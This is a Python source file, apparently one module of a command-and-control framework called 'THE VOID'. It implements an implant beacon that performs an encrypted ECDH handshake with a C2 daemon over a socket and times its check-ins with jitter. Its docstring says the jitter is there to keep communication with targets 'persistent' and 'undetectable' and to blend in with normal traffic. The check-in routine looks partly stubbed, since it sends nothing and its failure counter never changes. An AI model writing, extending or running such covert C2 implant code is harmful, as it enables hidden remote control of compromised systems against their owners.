"""THE VOID — Beacon: C2 beacon module.

The agent uses beacons to maintain persistent, undetectable communication
with its targets. Each beacon is a lightweight, encrypted heartbeat that
can be tuned to blend in with normal network traffic.
"""

import json
import logging
import time
import random
from typing import Any, Dict, Optional

from c2.handshake import HandshakeClient, Session
from core.crypto import Crypto

logger = logging.getLogger("void.c2.beacon")


class Beacon:
    """A C2 beacon — lightweight, encrypted heartbeat for C2 communication."""

    def __init__(self, beacon_id: str = "", crypto: Optional[Crypto] = None):
        self.beacon_id = beacon_id or self._generate_id()
        self.crypto = crypto or Crypto()
        self.interval = 30  # seconds
        self.jitter = 0.2   # 20% jitter
        self.max_failed = 5
        self.failed = 0
        self.last_checkin = time.time()
        self.active = True
        self.session: Optional[Session] = None
        logger.info(f"Beacon {self.beacon_id} initialized")

    def perform_handshake(self, sock) -> Session:
        """Run the ECDH handshake with a C2 daemon over ``sock``.

        On success the beacon stores the session and uses it to seal all
        subsequent traffic. Raises on any handshake failure.
        """
        client = HandshakeClient(self.beacon_id, crypto=self.crypto)
        hello = client.hello()
        sock.send(self.crypto.encrypt(json.dumps(hello)).encode())
        reply_blob = sock.recv(65536)
        reply = json.loads(self.crypto.decrypt(reply_blob.decode()))
        confirm, session = client.process_reply(reply)
        sock.send(self.crypto.encrypt(json.dumps(confirm)).encode())
        ack_blob = sock.recv(65536)
        session.open(ack_blob.decode())  # session-sealed ack
        self.session = session
        logger.info(f"Beacon {self.beacon_id} handshake complete")
        return session

    def _generate_id(self) -> str:
        """Generate a unique beacon ID."""
        return f"void-{random.randint(1000, 9999)}"

    def checkin(self, payload: Dict[str, Any] = None) -> Dict[str, Any]:
        """Perform a checkin with the C2 server.

        Args:
            payload: Optional payload to send

        Returns:
            Dict with checkin result
        """
        if not self.active:
            return {"status": "inactive", "beacon_id": self.beacon_id}

        now = time.time()
        elapsed = now - self.last_checkin
        if elapsed < self.interval * (1 - self.jitter):
            return {"status": "sleeping", "beacon_id": self.beacon_id, "elapsed": elapsed}

        self.last_checkin = now
        payload = payload or {}
        encrypted = self.crypto.encrypt(json.dumps(payload))
        result = {"status": "active", "beacon_id": self.beacon_id, "timestamp": now, "payload": encrypted[:200]}
        self.failed = 0
        logger.debug(f"Beacon {self.beacon_id} checkin: {result}")
        return result

    def get_next_interval(self) -> float:
        """Get the next interval with jitter."""
        return self.interval * (1 + random.uniform(-self.jitter, self.jitter))

    def set_interval(self, interval: float, jitter: float = 0.2) -> None:
        """Set the beacon interval and jitter.

        Args:
            interval: Interval in seconds
            jitter: Jitter as a fraction (0-1)
        """
        self.interval = interval
        self.jitter = jitter
        logger.info(f"Beacon {self.beacon_id} interval set to {interval}s (jitter={jitter})")

    def deactivate(self) -> None:
        """Deactivate the beacon."""
        self.active = False
        logger.info(f"Beacon {self.beacon_id} deactivated")

    def activate(self) -> None:
        """Activate the beacon."""
        self.active = True
        logger.info(f"Beacon {self.beacon_id} activated")

    def get_status(self) -> Dict[str, Any]:
        """Get the current beacon status."""
        return {
            "beacon_id": self.beacon_id,
            "active": self.active,
            "interval": self.interval,
            "jitter": self.jitter,
            "last_checkin": self.last_checkin,
            "failed": self.failed,
        }
